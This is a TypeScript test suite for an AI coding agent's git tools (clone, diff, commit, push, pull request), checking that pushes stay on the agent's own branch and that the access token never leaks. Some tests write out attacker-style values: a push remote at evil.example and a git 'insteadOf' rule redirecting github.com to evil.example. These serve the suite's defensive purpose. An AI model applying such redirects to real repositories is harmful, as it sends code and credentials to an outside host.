// ShapesOS — Phase 8 (ship): the git tools against real git in the TEST-ONLY
// fake Sandbox (temp dir + child_process; a local bare repo stands in for
// GitHub; no network, no database — state, events and profiles are in memory).
// Run: npx tsx --test lib/ship/__tests__/git-tools.test.ts

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import * as path from "node:path";
import { createShipTools, defaultGetSandbox, type ShipDeps } from "../tools";
import type { ShipState } from "../state";
import type { RepoAccess } from "../access";
import type { AgentRunEventInput } from "@/lib/agents/runs/types";
import type { ToolContext, ToolDef } from "@/lib/chat/tools";
import type { DetectedRepoProfile } from "@/lib/sandbox/repo-profile";
import type { GitHubConnector, GitHubPullRequest } from "@/lib/connectors/types";
import { CREDENTIAL_HELPER, GIT_TOKEN_ENV } from "../git";
import { createFakeSandbox, remoteRef, seedRemote, type FakeSandbox } from "./fake-sandbox";

const TOKEN = "ghp_SECRETtoken0123456789abcdefXYZ";
const OWNER = "acme";
const REPO = "site";

let sb: FakeSandbox;
let bare = "";
const states = new Map<string, ShipState>();
const events: Array<{ runId: string; event: AgentRunEventInput }> = [];
const profiles = new Map<string, DetectedRepoProfile>();
const pulls: GitHubPullRequest[] = [];
const results: string[] = [];

function findPull(n: number): GitHubPullRequest {
  const p = pulls.find((x) => x.number === n);
  if (!p) throw new Error("Not found on GitHub");
  return p;
}

const connector = {
  async getRepo() {
    return { owner: OWNER, name: REPO, fullName: `${OWNER}/${REPO}`, private: true, defaultBranch: "main", updatedAt: null };
  },
  async getBranch(name: string) {
    const sha = await remoteRef(bare, `refs/heads/${name}`);
    return sha ? { name, sha, url: `https://github.com/${OWNER}/${REPO}/tree/${name}` } : null;
  },
  async findPullRequestForBranch(branch: string) {
    return pulls.find((p) => p.head === branch && p.state === "open") ?? null;
  },
  async getPullRequest(n: number) {
    return findPull(n);
  },
  async openPullRequest(input: { title: string; body?: string; head: string; base?: string; draft?: boolean }) {
    const pr: GitHubPullRequest = {
      number: pulls.length + 7,
      url: `https://github.com/${OWNER}/${REPO}/pull/${pulls.length + 7}`,
      title: input.title,
      body: input.body ?? "",
      state: "open",
      merged: false,
      draft: !!input.draft,
      head: input.head,
      base: input.base ?? "main",
      headSha: "abc",
      mergeable: true,
    };
    pulls.push(pr);
    return pr;
  },
  async updatePullRequest(n: number, patch: { title?: string; body?: string }) {
    const p = findPull(n);
    Object.assign(p, patch);
    return p;
  },
  async getPullRequestStatus(n: number) {
    const pr = findPull(n);
    const failing = [{ name: "unit tests", source: "check_run" as const, status: "completed", conclusion: "failure", url: "https://ci/1", summary: "2 failed" }];
    return { pr, state: "failure" as const, checks: failing, failing };
  },
  async listReviews() {
    return [{ id: 1, author: "rev", state: "CHANGES_REQUESTED", body: "Rename the helper.", url: "u", submittedAt: null }];
  },
  async listReviewComments() {
    return [{ id: 2, path: "src/a.js", line: 3, body: "Off by one here.", author: "rev", url: "u", createdAt: "", inReplyTo: null }];
  },
} as unknown as GitHubConnector;

const access: RepoAccess = {
  owner: OWNER,
  repo: REPO,
  fullName: `${OWNER}/${REPO}`,
  mode: "pat",
  connector,
  token: async () => TOKEN,
};

const deps: ShipDeps = {
  getSandbox: async () => sb,
  resolveAccess: async () => access,
  loadState: async (q) => (q.runId ? (states.get(q.runId) ?? (q.threadId ? states.get(`thread:${q.threadId}`) : undefined) ?? null) : null),
  saveState: async (_ws, runId, state) => {
    states.set(runId, state);
    states.set("thread:t1", state);
  },
  recordEvent: async (_ws, runId, event) => {
    events.push({ runId, event });
  },
  getProfile: async (_ws, repo) => (profiles.get(repo) ? ({ ...profiles.get(repo)!, workspaceId: "ws", repoFullName: repo, updatedAt: new Date() }) : null),
  saveProfile: async (_ws, repo, p) => {
    profiles.set(repo, p);
  },
};

const tools = new Map<string, ToolDef>(createShipTools(deps).map((t) => [t.name, t]));
const ctx = (runId = "run1"): ToolContext & { threadId: string } => ({
  projectId: "p",
  workspaceId: "ws",
  userId: "u",
  role: "editor",
  confirmed: true,
  runId,
  threadId: "t1",
});

async function call(name: string, args: Record<string, unknown> = {}, runId = "run1") {
  const res = await tools.get(name)!.execute(ctx(runId), args);
  results.push(res.summary);
  return res;
}

before(async () => {
  sb = createFakeSandbox();
  bare = await seedRemote(sb, OWNER, REPO, {
    "package.json": JSON.stringify({ name: "site", scripts: { test: "node --test", lint: "eslint .", build: "next build" } }),
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
    "src/a.js": "export const a = 1;\n",
  });
});

after(async () => {
  await sb.destroy();
});

describe("git tools (real git, fake sandbox, no network)", () => {
  it("refuses everything before a clone, and outside a tracked run", async () => {
    await assert.rejects(() => tools.get("git_status")!.execute({ ...ctx("other"), threadId: "none" } as ToolContext, {}), /git_clone first/);
    await assert.rejects(() => tools.get("git_clone")!.execute({ ...ctx(), runId: undefined }, { repo: "acme/site" }), /tracked agent run/);
  });

  it("git_clone clones on shapes/<runId> and detects the repo profile", async () => {
    const res = await call("git_clone", { repo: "acme/site" });
    assert.match(res.summary, /on branch shapes\/run1/);
    const st = states.get("run1")!;
    assert.equal(st.branch, "shapes/run1");
    assert.equal(st.defaultBranch, "main");
    assert.equal(st.dir, path.join(sb.workdir, "site"));
    assert.ok(existsSync(path.join(st.dir, "src/a.js")));
    const p = profiles.get("acme/site")!;
    assert.equal(p.packageManager, "pnpm");
    assert.equal(p.commands.test, "pnpm test");
    assert.equal(p.commands.build, "pnpm run build");
    assert.ok(events.some((e) => e.event.payload?.tool === "git_clone"));
    // A second clone in the same task reuses it.
    assert.match((await call("git_clone", { repo: "acme/site" })).summary, /already cloned/);
  });

  it("git_status and git_diff see edits (new files too) against the start", async () => {
    const st = states.get("run1")!;
    await sb.writeFile(path.join(st.dir, "src/a.js"), "export const a = 2;\n");
    await sb.writeFile(path.join(st.dir, "src/new.js"), "export const b = 3;\n");
    assert.match((await call("git_status")).summary, /2 changed files/);
    const diff = await call("git_diff");
    assert.match(diff.summary, /2 files changed \(\+2 −1\)/);
    const ev = events.filter((e) => e.event.payload?.tool === "git_diff").at(-1)!;
    const patch = String(ev.event.payload!.patch);
    assert.match(patch, /\+export const a = 2;/);
    assert.match(patch, /-export const a = 1;/);
    assert.match(patch, /new file mode/);
  });

  it("git_commit commits on the run's branch and stores the patch", async () => {
    const res = await call("git_commit", { message: "Bump a, add b" });
    assert.match(res.summary, /Committed [0-9a-f]{7} on shapes\/run1/);
    const ev = events.filter((e) => e.event.payload?.tool === "git_commit").at(-1)!;
    assert.match(String(ev.event.payload!.patch), /src\/new\.js/);
    assert.match((await call("git_commit", { message: "again" })).summary, /Nothing to commit/);
  });

  it("git_push_branch refuses force and any other ref", async () => {
    await assert.rejects(() => call("git_push_branch", { force: true }), /Force-pushing is never allowed/);
    await assert.rejects(() => call("git_push_branch", { branch: "main" }), /never pushes to main/);
    await assert.rejects(() => call("git_push_branch", { ref: "refs/heads/release" }), /never pushes to release/);
    await assert.rejects(() => call("git_push_branch", { remote: "https://evil.example/x.git" }), /only pushes to the repository it cloned/);
    assert.equal(await remoteRef(bare, "refs/heads/shapes/run1"), null);
  });

  it("refuses the default branch even when the stored branch was tampered with", async () => {
    const st = states.get("run1")!;
    states.set("tampered", { ...st, branch: "main" });
    await assert.rejects(() => call("git_push_branch", {}, "tampered"), /Refusing to push/);
    states.delete("tampered");
  });

  it("refuses a clone that rewrites remote URLs", async () => {
    const st = states.get("run1")!;
    await sb.exec(["git", "-C", st.dir, "config", "url.https://evil.example/.insteadOf", "https://github.com/"]);
    await assert.rejects(() => call("git_push_branch"), /rewrites remote URLs/);
    await sb.exec(["git", "-C", st.dir, "config", "--remove-section", "url.https://evil.example/"]);
  });

  it("pushes HEAD to shapes/<runId> only — never the default branch, even from a local main", async () => {
    const mainBefore = await remoteRef(bare, "refs/heads/main");
    const st = states.get("run1")!;
    // The agent wanders onto a local main and commits there: the push target is still the run's branch.
    await sb.exec(["git", "-C", st.dir, "checkout", "-q", "-b", "local-main"]);
    const res = await call("git_push_branch");
    assert.match(res.summary, /Pushed 1 commit to shapes\/run1: https:\/\/github\.com\/acme\/site\/tree\/shapes\/run1/);
    assert.ok(await remoteRef(bare, "refs/heads/shapes/run1"));
    assert.equal(await remoteRef(bare, "refs/heads/main"), mainBefore, "main is untouched");
    assert.equal(states.get("run1")!.branchUrl, "https://github.com/acme/site/tree/shapes/run1");
    await sb.exec(["git", "-C", st.dir, "checkout", "-q", "shapes/run1"]);
  });

  it("open_pull_request opens (then updates) the PR; read_pr_feedback reports checks and reviews", async () => {
    const opened = await call("open_pull_request", { title: "Bump a", body: "Tested with node --test" });
    assert.match(opened.summary, /Opened pull request #7/);
    assert.equal(states.get("run1")!.prUrl, "https://github.com/acme/site/pull/7");
    assert.equal(pulls[0]!.head, "shapes/run1");
    assert.equal(pulls[0]!.base, "main");
    assert.match((await call("open_pull_request", { title: "Bump a (v2)" })).summary, /Updated pull request #7/);
    const fb = await call("read_pr_feedback");
    assert.match(fb.summary, /checks: failure/);
    assert.match(fb.summary, /unit tests: failure — 2 failed/);
    assert.match(fb.summary, /rev: CHANGES_REQUESTED — Rename the helper\./);
    assert.match(fb.summary, /src\/a\.js:3 rev: Off by one here\./);
  });

  it("the token never appears in a command line, a run event or a tool result", () => {
    for (const e of sb.log) {
      assert.ok(!e.argv.some((a) => a.includes(TOKEN)), `token in argv: ${e.argv.join(" ")}`);
      assert.ok(!e.cwd.includes(TOKEN));
    }
    // It travels only in the env of the clone / push processes.
    const withToken = sb.log.filter((e) => e.env[GIT_TOKEN_ENV] === TOKEN);
    assert.ok(withToken.length >= 2);
    for (const e of withToken) assert.ok(e.argv.includes("clone") || e.argv.includes("push") || e.argv.includes("fetch"));
    assert.ok(!JSON.stringify(events).includes(TOKEN));
    assert.ok(!results.some((r) => r.includes(TOKEN)));
    // The clone's stored config carries no credential either.
    const st = states.get("run1")!;
    return sb.exec(["git", "-C", st.dir, "config", "--list"]).then((r) => {
      assert.ok(!r.stdout.includes(TOKEN));
      assert.ok(!/credential\.helper/.test(r.stdout));
    });
  });

  it("the inline credential helper answers only https://github.com, from the env", async () => {
    const fill = (input: string) =>
      sb.exec(["sh", "-c", `printf '${input}' | git -c credential.helper= -c 'credential.helper=${CREDENTIAL_HELPER.replace(/'/g, "'\\''")}' credential fill`], {
        env: { [GIT_TOKEN_ENV]: TOKEN, GIT_TERMINAL_PROMPT: "0", GIT_ASKPASS: "/bin/false" },
      });
    const ok = await fill("protocol=https\\nhost=github.com\\n\\n");
    assert.match(ok.stdout, new RegExp(`password=${TOKEN}`));
    assert.match(ok.stdout, /username=x-access-token/);
    const evil = await fill("protocol=https\\nhost=evil.example\\n\\n");
    assert.doesNotMatch(evil.stdout, new RegExp(TOKEN));
  });

  it("the default getSandbox is lib/sandbox's sandboxForRun — it refuses outside a run (never fakes)", async () => {
    const { SandboxUnavailableError } = await import("@/lib/sandbox/index");
    await assert.rejects(
      () => defaultGetSandbox({ ...ctx(), runId: undefined }),
      (err: unknown) => err instanceof SandboxUnavailableError && /inside an agent run/.test(String(err)),
    );
  });
});
